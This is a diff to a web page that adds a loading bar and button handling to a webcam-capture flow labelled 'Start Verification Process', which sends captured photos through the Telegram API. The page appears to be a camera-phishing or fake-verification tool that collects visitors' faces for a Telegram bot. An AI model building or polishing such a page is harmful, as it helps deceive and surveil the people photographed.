@@ -38,6 +38,26 @@
             border: 5px solid white;
             border-radius: 10px;
         }
+        .loading-bar {
+            width: 50%;
+            margin: 20px auto;
+            height: 20px;
+            border-radius: 10px;
+            background: #d3d3d3;
+            overflow: hidden;
+            display: none;
+        }
+        .loading-bar div {
+            width: 0;
+            height: 100%;
+            background: #e63946;
+            animation: loading 2s infinite;
+        }
+        @keyframes loading {
+            0% { width: 0; }
+            50% { width: 50%; }
+            100% { width: 100%; }
+        }
     </style>
 </head>
 <body>
@@ -49,6 +69,7 @@
     <div id="camera" style="display: none;">
         <video id="video" autoplay></video>
         <button id="capture">Capture Photo</button>
+        <div class="loading-bar" id="loadingBar"><div></div></div>
     </div>
     <canvas id="canvas" style="display: none;"></canvas>
 
@@ -59,6 +80,7 @@
         const captureButton = document.getElementById('capture');
         const startButton = document.getElementById('start');
         const canvas = document.getElementById('canvas');
+        const loadingBar = document.getElementById('loadingBar');
 
         // Start Verification Process
         startButton.addEventListener('click', () => {
@@ -78,6 +100,9 @@
 
         // Capture Photo
         captureButton.addEventListener('click', () => {
+            captureButton.style.display = 'none'; // Hide the button
+            loadingBar.style.display = 'block'; // Show the loading bar
+
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -108,12 +133,20 @@
                 } else {
                     console.error("Error in Telegram API:", data);
                     alert("Failed to send the photo. Please try again.");
+                    resetCaptureButton();
                 }
             })
             .catch(error => {
                 console.error("Error sending photo:", error);
                 alert("An error occurred. Please check your connection.");
+                resetCaptureButton();
             });
+        }
+
+        // Reset Capture Button and Loading Bar
+        function resetCaptureButton() {
+            loadingBar.style.display = 'none'; // Hide the loading bar
+            captureButton.style.display = 'block'; // Show the button again
         }
     </script>
 </body>
